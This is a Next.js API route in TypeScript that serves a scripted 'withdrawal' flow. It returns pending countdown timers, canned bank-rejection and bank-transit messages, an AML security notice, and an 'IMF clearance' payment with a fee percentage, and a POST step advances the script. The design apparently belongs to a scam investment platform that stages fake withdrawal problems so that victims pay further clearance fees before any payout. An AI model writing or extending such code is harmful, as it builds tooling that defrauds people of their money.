import { NextRequest, NextResponse } from "next/server";
import { getSessionUserId, unauthorizedResponse } from "@/lib/api-auth";
import { prisma } from "@/lib/prisma";
import {
  getWithdrawalScriptSettings,
  WITHDRAWAL_SCRIPT_PENDING_SECONDS,
  WITHDRAWAL_SCRIPT_AML_REASON,
  completeWithdrawalScriptPendingTimer,
  isWithdrawalScriptCycleComplete,
} from "@/lib/withdrawal-script";
import { getWithdrawalMethodLabel } from "@/lib/withdrawal-methods";
import { getBankRejectFailureCopy, getBankTransitCopy } from "@/lib/withdrawal-script-messages";

export async function GET(_req: NextRequest, { params }: { params: Promise<{ id: string }> }) {
  const userId = await getSessionUserId();
  if (!userId) return unauthorizedResponse();

  try {
    const { id } = await params;
    const withdrawal = await prisma.withdrawalRequest.findFirst({
      where: { id, userId },
      include: { chargePayment: true, imfClearancePayment: true },
    });
    if (!withdrawal) {
      return NextResponse.json({ error: "Withdrawal not found" }, { status: 404 });
    }

    const script = await getWithdrawalScriptSettings();
    const dbUser = await prisma.user.findUnique({
      where: { id: userId },
      select: { withdrawalScriptStep: true },
    });
    const pendingStarted = withdrawal.scriptPendingStartedAt?.getTime() ?? null;
    const pendingSecondsRemaining =
      withdrawal.scriptPhase === "PENDING_TIMER" && pendingStarted
        ? Math.max(0, WITHDRAWAL_SCRIPT_PENDING_SECONDS - (Date.now() - pendingStarted) / 1000)
        : 0;
    const bankReject = getBankRejectFailureCopy(withdrawal.method);
    const imfPaid = withdrawal.imfClearancePayment?.status === "PAID";
    const userStep = dbUser?.withdrawalScriptStep ?? 0;
    const pendingMode =
      withdrawal.scriptPhase === "PENDING_TIMER" && userStep === 3 && imfPaid ? "bank-transit" : "standard";
    const bankTransit = pendingMode === "bank-transit" ? getBankTransitCopy(withdrawal.method) : null;
    const cycleComplete = isWithdrawalScriptCycleComplete(withdrawal, userStep);

    return NextResponse.json({
      withdrawal: {
        id: withdrawal.id,
        amountUsd: Number(withdrawal.amountUsd),
        method: withdrawal.method,
        methodLabel: getWithdrawalMethodLabel(withdrawal.method),
        scriptPhase: withdrawal.scriptPhase,
        status: withdrawal.status,
      },
      withdrawalScriptStep: userStep,
      pendingMode,
      bankTransit,
      bankRejectFailure: bankReject,
      chargeAmountUsd: withdrawal.chargePayment ? Number(withdrawal.chargePayment.amountUsd) : null,
      imfClearance: withdrawal.imfClearancePayment
        ? {
            id: withdrawal.imfClearancePayment.id,
            amountUsd: Number(withdrawal.imfClearancePayment.amountUsd),
            status: withdrawal.imfClearancePayment.status,
          }
        : null,
      imfClearanceFeePercent: script.imfClearanceFeePercent,
      pendingSecondsRemaining: Math.ceil(pendingSecondsRemaining),
      pendingSecondsTotal: WITHDRAWAL_SCRIPT_PENDING_SECONDS,
      securityMessage: WITHDRAWAL_SCRIPT_AML_REASON,
      cycleComplete,
      intermediateBankReject: withdrawal.scriptPhase === "BANK_REJECTED" && !cycleComplete,
    });
  } catch (error) {
    console.error("Withdrawal script GET error:", error);
    return NextResponse.json({ error: "Failed to load withdrawal status" }, { status: 500 });
  }
}

export async function POST(_req: NextRequest, { params }: { params: Promise<{ id: string }> }) {
  const userId = await getSessionUserId();
  if (!userId) return unauthorizedResponse();

  try {
    const { id } = await params;
    const result = await completeWithdrawalScriptPendingTimer(userId, id);
    return NextResponse.json({ success: true, ...result });
  } catch (error) {
    const message = error instanceof Error ? error.message : "Failed to complete confirmation";
    return NextResponse.json({ error: message }, { status: 400 });
  }
}
